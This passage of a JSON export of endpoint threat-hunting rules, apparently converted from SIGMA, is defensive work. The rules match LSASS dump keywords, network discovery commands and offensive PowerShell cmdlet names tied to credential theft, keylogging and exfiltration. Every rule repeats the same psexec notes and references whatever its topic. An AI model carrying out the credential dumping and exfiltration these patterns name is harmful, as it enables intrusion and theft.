\"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 244
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1016"
            ],
            "name": "Suspicious Network Command",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"ipconfig /all\" or tgt.process.cmdline contains \"netsh interface show interface\" or tgt.process.cmdline contains \"arp -a\" or tgt.process.cmdline contains \"nbtstat -n\" or tgt.process.cmdline contains \"net config\" or tgt.process.cmdline contains \"route print\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 245
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of \"csc.exe\" to compile .NET code. Attackers often leverage this to compile code on the fly and use it in other stages.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027"
            ],
            "name": "Dynamic .NET Compilation Via Csc.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\csc.exe\" and ((tgt.process.cmdline contains \":\\Perflogs\\\" or tgt.process.cmdline contains \":\\Users\\Public\\\" or tgt.process.cmdline contains \"\\AppData\\Local\\Temp\\\" or tgt.process.cmdline contains \"\\Temporary Internet\" or tgt.process.cmdline contains \"\\Windows\\Temp\\\") or ((tgt.process.cmdline contains \":\\Users\\\" and tgt.process.cmdline contains \"\\Favorites\\\") or (tgt.process.cmdline contains \":\\Users\\\" and tgt.process.cmdline contains \"\\Favourites\\\") or (tgt.process.cmdline contains \":\\Users\\\" and tgt.process.cmdline contains \"\\Contacts\\\") or (tgt.process.cmdline contains \":\\Users\\\" and tgt.process.cmdline contains \"\\Pictures\\\")) or tgt.process.cmdline matches \"([Pp]rogram[Dd]ata|%([Ll]ocal)?[Aa]pp[Dd]ata%|\\\\\\\\[Aa]pp[Dd]ata\\\\\\\\([Ll]ocal([Ll]ow)?|[Rr]oaming))\\\\\\\\[^\\\\\\\\]{1,256}$\") and (not ((src.process.image.path contains \"C:\\Program Files (x86)\\\" or src.process.image.path contains \"C:\\Program Files\\\") or src.process.image.path=\"C:\\Windows\\System32\\sdiagnhost.exe\" or src.process.image.path=\"C:\\Windows\\System32\\inetsrv\\w3wp.exe\")) and (not ((src.process.image.path in (\"C:\\ProgramData\\chocolatey\\choco.exe\",\"C:\\ProgramData\\chocolatey\\tools\\shimgen.exe\")) or src.process.cmdline contains \"\\ProgramData\\Microsoft\\Windows Defender Advanced Threat Protection\" or (src.process.cmdline contains \"JwB7ACIAZgBhAGkAbABlAGQAIgA6AHQAcgB1AGUALAAiAG0AcwBnACIAOgAiAEEAbgBzAGkAYgBsAGUAIAByAGUAcQB1AGkAcgBlAHMAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAdgAzAC4AMAAgAG8AcgAgAG4AZQB3AGUAcgAiAH0AJw\" or src.process.cmdline contains \"cAewAiAGYAYQBpAGwAZQBkACIAOgB0AHIAdQBlACwAIgBtAHMAZwAiADoAIgBBAG4AcwBpAGIAbABlACAAcgBlAHEAdQBpAHIAZQBzACAAUABvAHcAZQByAFMAaABlAGwAbAAgAHYAMwAuADAAIABvAHIAIABuAGUAdwBlAHIAIgB9ACcA\" or src.process.cmdline contains \"nAHsAIgBmAGEAaQBsAGUAZAAiADoAdAByAHUAZQAsACIAbQBzAGcAIgA6ACIAQQBuAHMAaQBiAGwAZQAgAHIAZQBxAHUAaQByAGUAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAB2ADMALgAwACAAbwByACAAbgBlAHcAZQByACIAfQAnA\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 246
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the presence of the keywords \"lsass\" and \".dmp\" in the commandline, which could indicate a potential attempt to dump or create a dump of the lsass process.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003"
            ],
            "name": "LSASS Dump Keyword In CommandLine",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"lsass.dmp\" or tgt.process.cmdline contains \"lsass.zip\" or tgt.process.cmdline contains \"lsass.rar\" or tgt.process.cmdline contains \"Andrew.dmp\" or tgt.process.cmdline contains \"Coredump.dmp\" or tgt.process.cmdline contains \"NotLSASS.zip\" or tgt.process.cmdline contains \"lsass_2\" or tgt.process.cmdline contains \"lsassdump\" or tgt.process.cmdline contains \"lsassdmp\") or (tgt.process.cmdline contains \"lsass\" and tgt.process.cmdline contains \".dmp\") or (tgt.process.cmdline contains \"SQLDmpr\" and tgt.process.cmdline contains \".mdmp\") or (tgt.process.cmdline contains \"nanodump\" and tgt.process.cmdline contains \".dmp\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 247
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the installation of a DNS plugin DLL via ServerLevelPluginDll parameter in registry, which can be used to execute code in context of the DNS server (restart required)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1574",
                "t1112"
            ],
            "name": "New DNS ServerLevelPluginDll Installed Via Dnscmd.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\dnscmd.exe\" and (tgt.process.cmdline contains \"/config\" and tgt.process.cmdline contains \"/serverlevelplugindll\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 248
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious command line execution that invokes PowerShell with reference to an AppData folder",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "PowerShell Script Run in AppData",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"powershell.exe\" or tgt.process.cmdline contains \"\\powershell\" or tgt.process.cmdline contains \"\\pwsh\" or tgt.process.cmdline contains \"pwsh.exe\") and ((tgt.process.cmdline contains \"/c \" and tgt.process.cmdline contains \"\\AppData\\\") and (tgt.process.cmdline contains \"Local\\\" or tgt.process.cmdline contains \"Roaming\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 249
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of the \"wusa.exe\" (Windows Update Standalone Installer) utility to extract \".cab\" files using the \"/extract\" argument from potentially suspicious paths.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Cab File Extraction Via Wusa.EXE From Potentially Suspicious Paths",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\wusa.exe\" and tgt.process.cmdline contains \"/extract:\") and (tgt.process.cmdline contains \":\\PerfLogs\\\" or tgt.process.cmdline contains \":\\Users\\Public\\\" or tgt.process.cmdline contains \":\\Windows\\Temp\\\" or tgt.process.cmdline contains \"\\Appdata\\Local\\Temp\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 250
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects an uncommon svchost parent process",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "Uncommon Svchost Parent Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\svchost.exe\" and (not ((src.process.image.path contains \"\\Mrt.exe\" or src.process.image.path contains \"\\MsMpEng.exe\" or src.process.image.path contains \"\\ngen.exe\" or src.process.image.path contains \"\\rpcnet.exe\" or src.process.image.path contains \"\\services.exe\" or src.process.image.path contains \"\\TiWorker.exe\") or not (src.process.image.path matches \"\\.*\") or (src.process.image.path in (\"-\",\"\"))))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 251
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Commandlet names from well-known PowerShell exploitation frameworks",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1482",
                "t1087",
                "t1087",
                "t1087",
                "t1069",
                "t1069",
                "t1069",
                "t1059"
            ],
            "name": "Malicious PowerShell Commandlets - ProcessCreation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"Add-Exfiltration\" or tgt.process.cmdline contains \"Add-Persistence\" or tgt.process.cmdline contains \"Add-RegBackdoor\" or tgt.process.cmdline contains \"Add-RemoteRegBackdoor\" or tgt.process.cmdline contains \"Add-ScrnSaveBackdoor\" or tgt.process.cmdline contains \"Check-VM\" or tgt.process.cmdline contains \"ConvertTo-Rc4ByteStream\" or tgt.process.cmdline contains \"Decrypt-Hash\" or tgt.process.cmdline contains \"Disable-ADIDNSNode\" or tgt.process.cmdline contains \"Disable-MachineAccount\" or tgt.process.cmdline contains \"Do-Exfiltration\" or tgt.process.cmdline contains \"Enable-ADIDNSNode\" or tgt.process.cmdline contains \"Enable-MachineAccount\" or tgt.process.cmdline contains \"Enabled-DuplicateToken\" or tgt.process.cmdline contains \"Exploit-Jboss\" or tgt.process.cmdline contains \"Export-ADR\" or tgt.process.cmdline contains \"Export-ADRCSV\" or tgt.process.cmdline contains \"Export-ADRExcel\" or tgt.process.cmdline contains \"Export-ADRHTML\" or tgt.process.cmdline contains \"Export-ADRJSON\" or tgt.process.cmdline contains \"Export-ADRXML\" or tgt.process.cmdline contains \"Find-Fruit\" or tgt.process.cmdline contains \"Find-GPOLocation\" or tgt.process.cmdline contains \"Find-TrustedDocuments\" or tgt.process.cmdline contains \"Get-ADIDNS\" or tgt.process.cmdline contains \"Get-ApplicationHost\" or tgt.process.cmdline contains \"Get-ChromeDump\" or tgt.process.cmdline contains \"Get-ClipboardContents\" or tgt.process.cmdline contains \"Get-FoxDump\" or tgt.process.cmdline contains \"Get-GPPPassword\" or tgt.process.cmdline contains \"Get-IndexedItem\" or tgt.process.cmdline contains \"Get-KerberosAESKey\" or tgt.process.cmdline contains \"Get-Keystrokes\" or tgt.process.cmdline contains \"Get-LSASecret\" or tgt.process.cmdline contains \"Get-MachineAccountAttribute\" or tgt.process.cmdline contains \"Get-MachineAccountCreator\" or tgt.process.cmdline contains \"Get-PassHashes\" or tgt.process.cmdline contains \"Get-RegAlwaysInstallElevated\" or tgt.process.cmdline contains \"Get-RegAutoLogon\" or tgt.process.cmdline contains \"Get-RemoteBootKey\" or tgt.process.cmdline contains \"Get-RemoteCachedCredential\" or tgt.process.cmdline contains \"Get-RemoteLocalAccountHash\" or tgt.process.cmdline contains \"Get-RemoteLSAKey\" or tgt.process.cmdline contains \"Get-RemoteMachineAccountHash\" or tgt.process.cmdline contains \"Get-RemoteNLKMKey\" or tgt.process.cmdline contains \"Get-RickAstley\" or tgt.process.cmdline contains \"Get-Screenshot\" or tgt.process.cmdline contains \"Get-SecurityPackages\" or tgt.process.cmdline contains \"Get-ServiceFilePermission\" or tgt.process.cmdline contains \"Get-ServicePermission\" or tgt.process.cmdline contains \"Get-ServiceUnquoted\" or tgt.process.cmdline contains \"Get-SiteListPassword\" or tgt.process.cmdline contains \"Get-System\" or tgt.process.cmdline contains \"Get-TimedScreenshot\" or tgt.process.cmdline contains \"Get-UnattendedInstallFile\" or tgt.process.cmdline contains \"Get-Unconstrained\" or tgt.process.cmdline contains \"Get-USBKeystrokes\" or tgt.process.cmdline contains \"Get-VaultCredential\" or tgt.process.cmdline contains \"Get-VulnAutoRun\" or tgt.process.cmdline contains \"Get-VulnSchTask\" or tgt.process.cmdline contains \"Grant-ADIDNSPermission\" or tgt.process.cmdline contains \"Gupt-Backdoor\" or tgt.process.cmdline contains \"HTTP-Login\" or tgt.process.cmdline contains \"Install-ServiceBinary\" or tgt.process.cmdline contains \"Install-SSP\" or tgt.process.cmdline contains \"Invoke-ACLScanner\" or tgt.process.cmdline contains \"Invoke-ADRecon\" or tgt.process.cmdline contains \"Invoke-ADSBackdoor\" or tgt.process.cmdline contains \"Invoke-AgentSmith\" or tgt.process.cmdline contains \"Invoke-AllChecks\" or tgt.process.cmdline contains \"Invoke-ARPScan\" or tgt.process.cmdline contains \"Invoke-AzureHound\" or tgt.process.cmdline contains \"Invoke-BackdoorLNK\" or tgt.process.cmdline contains \"Invoke-BadPotato\" or tgt.process.cmdline contains \"Invoke-BetterSafetyKatz\" or tgt.process.cmdline contains \"Invoke-BypassUAC\" or tgt.process.cmdline contains \"Invoke-Carbuncle\" or tgt.process.cmdline contains \"Invoke-Certify\" or tgt.process.cmdline contains 